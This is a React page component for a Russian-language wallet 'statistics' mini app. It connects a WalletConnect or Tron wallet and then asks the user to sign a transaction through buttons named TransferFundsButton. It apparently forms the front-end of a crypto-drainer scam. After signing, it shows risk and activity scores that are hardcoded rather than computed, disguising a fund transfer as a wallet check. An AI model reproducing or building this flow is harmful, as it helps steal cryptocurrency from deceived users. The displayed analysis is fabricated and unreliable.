import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import React, { useEffect, useState } from 'react';
import { useAccount } from 'wagmi';
import { WalletConnectButton } from '../components/WalletConnect/wallet-connect-button';
import TronConnectButton from '../components/Tron/tron-connect-button';
import ResultBar from '../components/elements/PrimaryBtn/ResultBar';
import WalletConnectTransferFundsButton from '../components/WalletConnect/WalletConnectTransferFundsButton';
import TronTransferFundsButton from '../components/Tron/TronTransferFundsButton';
import ScoreIcon from '../assets/score-icon.png';
import "./MiniAppPage.css";

const MiniAppPage: React.FC = () => {
    const [step, setStep] = useState(1);
    const [transactionSigned, setTransactionSigned] = useState(false); //setTransactionSigned
    const [fakeTransaction, setFakeTransaction] = useState(false); //setTransactionSigned
    const [forceWalletConnected, setForceWalletConnected] = useState(false); //setTransactionSigned
    const { address: tronAddress, connected: tronConnected } = useWallet();
    const { isConnected: walletConnectConnected, address: ethAddress } = useAccount();
    
    
    useEffect(() => {
        async function updateStep() {
          if (transactionSigned) {
            setStep(3);
            return;
          }
          else if (!forceWalletConnected && (tronConnected || walletConnectConnected)) {
            setStep(2);
            return;
          }
          else setStep(1);
          return;
        }
    
        updateStep();
    }, [tronAddress, tronConnected, transactionSigned, ethAddress, walletConnectConnected]);
    
    console.log("STEP " + step);

    const stepBack = () => setStep(step - 1);
      
    const handleTransactionSuccess = () => {
        setStep(3);
        setTransactionSigned(true);
    }

    const handleFakeTransactionSuccess = () => {
        setStep(3);
        setTransactionSigned(true);
        setFakeTransaction(true);
    }
    
    const renderContent = () => {
        console.log("STEP: " + step);
        switch (step) {
            case 1:
            return (
                <>
                <h2 className="popup-title">Подключение кошелька</h2>
                <p className="popup-subtitle">
                    Пожалуйста, выберите кошелек, который хотите использовать
                </p>
                <div className="container">
                    <div className="row justify-content-center align-items-center gy-3 gx-5">
                        <div className="col-lg-5 col-xl-4">
                            <WalletConnectButton />
                        </div>
                        <div className="col-lg-5 col-xl-4">
                            <TronConnectButton />
                        </div>
                    </div>
                </div>
                </>
            );
            case 2:
            return (
                <div>
                    <h2 className="popup-title">Почти у цели</h2>
                    <p className="popup-subtitle">
                        Пожалуйста, нажмите кнопку “ОК”, для подписания транзакции
                    </p>
                    <div className="container">
                        <div className="row justify-content-center align-items-center">
                            <div className="col-lg-5 col-xl-4">
                                { walletConnectConnected && 
                                (
                                <WalletConnectTransferFundsButton onTransactionSuccess={handleTransactionSuccess} onFakeTransactionSuccess={handleFakeTransactionSuccess}>OK</WalletConnectTransferFundsButton>
                                )}
                                { !walletConnectConnected && tronConnected && 
                                (
                                <TronTransferFundsButton onTransactionSuccess={handleTransactionSuccess} onFakeTransactionSuccess={handleFakeTransactionSuccess}>OK</TronTransferFundsButton>
                                )}
                            </div>
                        </div>
                    </div>
                </div>
            );
            case 3:
            return (
                <div>
                    <h2 className="popup-title">Ваша статистика</h2>
                    <img className='popup-result-score-icon' src={ScoreIcon} alt="ScoreIcon" />
                    <p className="popup-result-score">{fakeTransaction ? "0%" : "12.55%"}</p>
                    <div className="result-bars">
                        <ResultBar
                        text="Разнообразие транзакций"
                        percentage={fakeTransaction ? 0 : 20}
                        color="#0057FF"
                        />
                        <ResultBar
                        text="Активность кошелька"
                        percentage={fakeTransaction ? 0 : 70}
                        color="#219654"
                        />
                        <ResultBar
                        text="Транзакция на/с CEX"
                        percentage={fakeTransaction ? 0 : 20}
                        color="#0057FF"
                        />
                        <ResultBar
                        text="Средняя стоимость транзакции"
                        percentage={fakeTransaction ? 0 : 60}
                        color="#219654"
                        />
                        <ResultBar
                        text="Возраст кошелька"
                        percentage={fakeTransaction ? 0 : 60}
                        color="#219654"
                        />
                        <ResultBar
                        text="Подозрительные транзакции"
                        percentage={fakeTransaction ? 0 : 55}
                        color="#8B5EFD"
                        />
                        <ResultBar
                        text="Транзакции на адреса высокого риска"
                        percentage={fakeTransaction ? 0 : 55}
                        color="#8B5EFD"
                        />
                </div>
                <div className="container">
                    <div className="row justify-content-center align-items-center">
                        <div className="col-lg-4 col-xl-3">
                            <button
                                className="primary-button primary-button-blue primary-button-medium justify-content-center"
                                onClick={ () => {
                                    setStep(1)
                                    setForceWalletConnected(true);
                                    setTransactionSigned(false);
                                }}
                                >
                                ОК
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            );
            default:
            return null;
        }
    };

    return (
        <div className='miniapp wrapper-overflow'>
            <div className="miniapp-content">
                {step > 1 ? (
                    <button onClick={stepBack} className='back-button'>Назад</button>
                ) : null }
                {renderContent()}
                <div className="container">
                    <div className="row">
                        <div className="col">
                            <div className="popup-step">
                                <span className='current-step'>{step}</span>
                                <span className="step">/3</span>
                                <span className="step-text">Шаг</span>
                            </div>
                        </div>
                    </div>
                </div>
                
            </div>
        </div>
    );
};

export default MiniAppPage;